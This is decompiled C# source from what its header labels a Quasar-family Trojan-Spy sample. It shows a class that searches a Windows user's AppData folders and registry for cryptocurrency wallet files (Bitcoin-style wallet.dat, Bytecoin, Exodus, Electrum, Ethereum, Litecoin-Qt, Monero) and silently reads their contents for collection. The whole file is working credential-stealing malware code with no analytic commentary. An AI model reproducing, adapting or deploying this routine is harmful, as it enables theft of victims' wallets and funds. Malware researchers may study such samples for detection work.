// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Data.Recovery.ColdIndetifier
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using Microsoft.Win32;
using NoiseMe.Drags.App.Data.Hlps;
using NoiseMe.Drags.App.Models.Common;
using NoiseMe.Drags.App.Models.Credentials;
using System;
using System.Collections.Generic;
using System.IO;

namespace NoiseMe.Drags.App.Data.Recovery
{
  public class ColdIndetifier : GH9kf<ColdWallet>
  {
    public List<ColdWallet> EnumerateData()
    {
      List<ColdWallet> coldWalletList = new List<ColdWallet>();
      try
      {
        try
        {
          List<string> paths = rcvr.FindPaths(strg.RoamingAppData, 2, 1, "wallet.dat", "wallet");
          paths.AddRange((IEnumerable<string>) rcvr.FindPaths(strg.LocalAppData, 2, 1, "wallet.dat", "wallet"));
          foreach (string str in paths)
          {
            try
            {
              FileInfo fileInfo = new FileInfo(str);
              coldWalletList.Add(new ColdWallet()
              {
                DataArray = File.ReadAllBytes(str),
                Name = fileInfo.Name,
                WalletName = fileInfo.Directory.Name
              });
            }
            catch
            {
            }
          }
        }
        catch (Exception ex)
        {
        }
        ColdWallet coldWallet1 = this.LTCQT();
        ColdWallet coldWallet2 = this.MNT();
        if (coldWallet1 != null)
          coldWalletList.Add(coldWallet1);
        if (coldWallet2 != null)
          coldWalletList.Add(coldWallet2);
        foreach (ColdWallet coldWallet3 in this.BYT() ?? new List<ColdWallet>())
        {
          if (coldWallet3 != null)
            coldWalletList.Add(coldWallet3);
        }
        foreach (ColdWallet coldWallet4 in this.ELECT() ?? new List<ColdWallet>())
        {
          if (coldWallet4 != null)
            coldWalletList.Add(coldWallet4);
        }
        foreach (ColdWallet coldWallet5 in this.ETH() ?? new List<ColdWallet>())
        {
          if (coldWallet5 != null)
            coldWalletList.Add(coldWallet5);
        }
        foreach (ColdWallet coldWallet6 in this.EXDS() ?? new List<ColdWallet>())
        {
          if (coldWallet6 != null)
            coldWalletList.Add(coldWallet6);
        }
      }
      catch
      {
      }
      return coldWalletList;
    }

    private List<ColdWallet> BYT()
    {
      List<ColdWallet> coldWalletList = new List<ColdWallet>();
      try
      {
        DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\bytecoin");
        if (directoryInfo.Exists)
        {
          foreach (FileInfo file in directoryInfo.GetFiles())
          {
            if (file.Extension.Equals(".wallet"))
            {
              byte[] numArray = File.ReadAllBytes(file.FullName);
              if (numArray != null)
                coldWalletList.Add(new ColdWallet()
                {
                  DataArray = numArray,
                  Name = file.Name,
                  WalletName = "Bytecoin"
                });
            }
          }
        }
      }
      catch
      {
      }
      return coldWalletList;
    }

    private List<ColdWallet> EXDS()
    {
      List<ColdWallet> coldWalletList = new List<ColdWallet>();
      try
      {
        DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Exodus\\exodus.wallet");
        if (directoryInfo.Exists)
        {
          foreach (FileInfo file in directoryInfo.GetFiles())
          {
            byte[] numArray = File.ReadAllBytes(file.FullName);
            if (numArray != null)
              coldWalletList.Add(new ColdWallet()
              {
                DataArray = numArray,
                Name = file.Name,
                WalletName = "Exodus"
              });
          }
        }
      }
      catch
      {
      }
      return coldWalletList;
    }

    private List<ColdWallet> ELECT()
    {
      List<ColdWallet> coldWalletList = new List<ColdWallet>();
      try
      {
        DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Electrum\\wallets");
        if (directoryInfo.Exists)
        {
          foreach (FileInfo file in directoryInfo.GetFiles())
          {
            if (file.Exists)
            {
              byte[] numArray = File.ReadAllBytes(file.FullName);
              if (numArray != null)
                coldWalletList.Add(new ColdWallet()
                {
                  DataArray = numArray,
                  Name = file.Name,
                  WalletName = "Electrum"
                });
            }
          }
        }
      }
      catch
      {
      }
      return coldWalletList;
    }

    private List<ColdWallet> ETH()
    {
      List<ColdWallet> coldWalletList = new List<ColdWallet>();
      try
      {
        DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Ethereum\\wallets");
        if (directoryInfo.Exists)
        {
          foreach (FileInfo file in directoryInfo.GetFiles())
          {
            if (file.Exists)
            {
              byte[] numArray = File.ReadAllBytes(file.FullName);
              if (numArray != null)
                coldWalletList.Add(new ColdWallet()
                {
                  DataArray = numArray,
                  Name = file.Name,
                  WalletName = "Ethereum"
                });
            }
          }
        }
      }
      catch
      {
      }
      return coldWalletList;
    }

    private ColdWallet LTCQT()
    {
      try
      {
        using (RegistryKey registryKey = Registry.CurrentUser?.OpenSubKey("Software")?.OpenSubKey("Litecoin")?.OpenSubKey("Litecoin-Qt"))
        {
          string path = registryKey?.GetValue("strDataDir").ToString() + "\\wallet.dat";
          if (File.Exists(path))
          {
            byte[] numArray = File.ReadAllBytes(path);
            if (numArray != null)
              return new ColdWallet()
              {
                DataArray = numArray,
                WalletName = "Litecoin-Qt",
                Name = "wallet.dat"
              };
          }
        }
      }
      catch
      {
      }
      return (ColdWallet) null;
    }

    private ColdWallet MNT()
    {
      try
      {
        using (RegistryKey registryKey = Registry.CurrentUser?.OpenSubKey("Software")?.OpenSubKey("monero-project")?.OpenSubKey("monero-core"))
        {
          char[] chArray = new char[1]{ '\\' };
          string path = registryKey?.GetValue("wallet_path").ToString().Replace("/", "\\");
          if (File.Exists(path))
          {
            byte[] numArray = File.ReadAllBytes(path);
            if (numArray != null)
              return new ColdWallet()
              {
                DataArray = numArray,
                WalletName = "Monero",
                Name = path.Split(chArray)[path.Split(chArray).Length - 1]
              };
          }
        }
      }
      catch
      {
      }
      return (ColdWallet) null;
    }
  }
}
